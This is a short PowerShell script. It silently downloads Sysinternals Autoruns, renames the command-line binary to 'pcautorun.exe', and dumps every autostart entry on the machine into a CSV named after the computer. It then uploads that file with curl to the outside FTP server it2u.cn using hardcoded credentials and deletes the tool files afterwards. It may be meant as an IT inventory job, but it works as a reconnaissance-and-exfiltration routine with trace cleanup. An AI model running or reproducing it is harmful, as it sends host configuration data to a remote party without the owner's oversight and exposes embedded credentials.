$ProgressPreference = 'SilentlyContinue'
$localAppData = $env:LOCALAPPDATA
$targetDirectory = Join-Path $localAppData "utools"

$autorunsc="https://download.sysinternals.com/files/Autoruns.zip"

Invoke-WebRequest -Uri $autorunsc -OutFile $targetDirectory\"autoruns.zip" -ErrorAction Stop

Expand-Archive -Path $targetDirectory\"autoruns.zip" -DestinationPath $targetDirectory -Force

Copy-Item -Path $targetDirectory\"autorunsc64.exe" -Destination $targetDirectory\"pcautorun.exe"


start-process -FilePath "$env:ComSpec" -WorkingDirectory $targetDirectory -ArgumentList "/c","pcautorun.exe"," -nobanner"," -accepteula"," -a * -ct > %COMPUTERNAME%.csv" -NoNewWindow -Wait


if (Test-Path -Path $targetDirectory\$env:COMPUTERNAME.csv) {
  start-process -FilePath "$env:ComSpec" -WorkingDirectory $targetDirectory -ArgumentList "/c"," curl -u uftp:ftp@123 -T %COMPUTERNAME%.csv  ftp://it2u.cn -s" -NoNewWindow -Wait
}


Remove-Item -Path $targetDirectory\autorun*.* -Force -ErrorAction SilentlyContinue
Remove-Item -Path $targetDirectory\autorun*.* -Force -ErrorAction SilentlyContinue